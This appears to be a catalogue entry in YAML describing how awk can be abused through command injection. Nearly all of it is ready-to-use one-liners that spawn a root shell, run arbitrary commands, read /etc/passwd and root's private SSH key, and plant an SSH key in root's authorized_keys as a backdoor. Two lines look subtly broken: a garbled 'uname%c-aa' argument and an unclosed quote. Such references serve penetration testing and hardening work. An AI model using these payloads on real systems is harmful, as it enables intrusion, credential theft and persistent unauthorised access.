---
description: Awk injection is no different than other command injection vulnerabilities, including SQL injection. Awk is an incredibly powerful (yet simple) tool, so the possibilities are endless. See [this report](https://bugs.chromium.org/p/chromium/issues/detail?id=766253) for an example.
functions:
  shell:
    - description: Can be used to execute arbitrary commands on a system and spawn shells.
      code:
        awk 'BEGIN{system("/bin/sh")}'
  command:
    - description: Can be used to execute arbitrary commands on a system.
      code: |
        awk 'BEGIN {system("ls"); exit}' /dev/null
        awk 'system("ls")' /etc/passwd # file must exist and command will be executed as many rows there are in the file
        awk '//{}BEGIN{system(sprintf("uname%c-aa",32))}' # use sprintf(%c,32) if we cannot use spaces.
  file-read:
    - description: Read an arbitrary file.
      code: |
        awk 'BEGIN{while((getline line<"/etc/passwd")>0){print line}}' /dev/null
        awk '//' /etc/passwd /etc/hostname /root/.ssh/id_rsa # prints the contents of all three files.
  file-write:
    - description: Write to an arbitrary file
      code: |
        awk 'BEGIN{print "ssh-rsa ..." > "/root/.ssh/authorized_keys}' /dev/null
---
